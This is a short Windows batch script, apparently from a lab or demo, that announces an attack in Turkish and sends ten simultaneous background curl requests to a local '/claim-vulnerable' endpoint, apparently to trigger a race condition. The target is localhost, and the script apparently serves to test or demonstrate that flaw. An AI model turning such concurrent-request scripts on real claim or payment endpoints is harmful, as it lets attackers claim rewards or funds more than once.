@echo off
echo SALDIRI BASLIYOR...
for /l %%i in (1,1,10) do start /b curl -s http://localhost:3000/claim-vulnerable
pause